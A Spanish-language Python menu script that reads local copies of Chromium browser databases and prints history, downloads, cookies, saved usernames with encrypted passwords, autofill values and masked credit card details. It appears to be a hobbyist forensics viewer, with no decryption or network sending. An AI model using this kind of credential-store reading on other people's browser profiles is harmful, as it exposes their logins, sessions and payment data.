import sqlite3
import platform
import os
import json

os.system('color 2')
Ver = platform.system()
if Ver == "Linux":
    os.system("clear")
elif Ver == "Windows":
    os.system("cls")
else:
    print("[+] No se reconoce el sistema operativo")
    
while True:
    def history():
        print("[+] 1 Ver url y nombre")
        print("[+] 2 Ver descargas")
        ver = input("[+] Seleccione una opcion-> ")
        if ver == "1":
            print("El archivo debe llamarse History.db")
            conn = sqlite3.connect('History.db')
            c = conn.cursor()
            c.execute('SELECT url, title FROM urls ORDER BY last_visit_time DESC')
            for row in c.fetchall():
                json_data = json.dumps(row)
                json_data = json.loads(json_data)
                print(f"[+] URL: {json_data[0]} \n[+] Nombre: {json_data[1]}\n")
                
                
                
        elif ver == "2":
            print("El archivo debe llamarse History.db")
            conn = sqlite3.connect('History.db')
            c = conn.cursor()
            c.execute('SELECT id, current_path FROM downloads')
            for row in c.fetchall():
                json_data = json.dumps(row)
                json_data = json.loads(json_data)
                print(f"[+] ID: {json_data[0]} \n[+] Descarga: {json_data[1]}\n")
                
    def cookies():
        print("[+] Alert: El nombre debe ser Cookies.db")
        print("[+] Escriba 1 para iniciar")
        ver = input("[+] Seleccione una opcion-> ")
        if ver == "1":
            print("El archivo debe llamarse Cookies.db")
            conn = sqlite3.connect('Cookies.db')
            c = conn.cursor()
            c.execute('SELECT host_key, name, encrypted_value FROM cookies')
            for row in c.fetchall():
                print(row)
        elif ver != "2":
            print("[+] Opcion no valida")
                
                
    def passw():
        print("[+] Alert: El nombre debe ser Login Data.db")
        print("[+] Escriba 1 para iniciar")
        ver = input("[+] Seleccione una opcion-> ")
        if ver == "1":
            print("El archivo debe llamarse Login Data.db")
            conn = sqlite3.connect('Login Data.db')
            c = conn.cursor()
            c.execute('SELECT origin_url, username_value, password_value, date_password_modified FROM logins')
            for row in c.fetchall():
                """print(row)"""
                url = row[0]
                username = row[1]
                passww = row[2]
                date = row[3]
                print(f"[+] URL: {url} \n[+] Usuario: {username} \n[+] Contraseña encriptada: {passww} \n[+] Date_pass: {date}")
                print("\n")
                
    def web_data(): 
        print("[+] Alert: El nombre debe ser Web Data.db")
        print("[+] Escriba 1 autofill")
        print("[+] Escriba 2 tarjetas de credito")
        ver = input("[+] Seleccione una opcion-> ")
        if ver == "1":
            print("El archivo debe llamarse Web Data.db")
            conn = sqlite3.connect('Web Data.db')
            c = conn.cursor()
            c.execute('SELECT name, value FROM autofill')
            for row in c.fetchall():
                json_data = json.dumps(row)
                json_data = json.loads(json_data)
                print(f"\n[+] Nombre: {json_data[0]} \n[+] Valor: {json_data[1]}")
        elif ver == "2":
            print("El archivo debe llamarse Web Data.db")
            conn = sqlite3.connect('Web Data.db')
            c = conn.cursor()
            c.execute('SELECT status, name_on_card, network, last_four, exp_month, exp_year FROM masked_credit_cards')
            for row in c.fetchall():
                json_data = json.dumps(row)
                json_data = json.loads(json_data)
                print(f"\n[+] Estado: {json_data[0]} \n[+] Nombre: {json_data[1]} \n[+] Tipo: {json_data[2]} \n[+] Ultimos Dijitos: {json_data[3]} \n[+]Expira mes: {json_data[4]} \n[+] Expira año: {json_data[5]}")
    print("___________________________________________________________________________________")
    print("[+] 1 Ver historial")
    print("[+] 2 Ver cookies(Mantenimiento)")
    print("[+] 3 Ver Contraseñas guardadas")
    print("[+] 4 Ver datos de web")
    print("[+] 99 Salir")
    option = input("[+] Seleccione una opcion-> ")
    if option == "1":
        history()
    elif option == "2":
        cookies()
    elif option == "3":
        passw()
    elif option == "4":
        web_data()
    elif option == "99":
        print("[+] Saliendo")
        break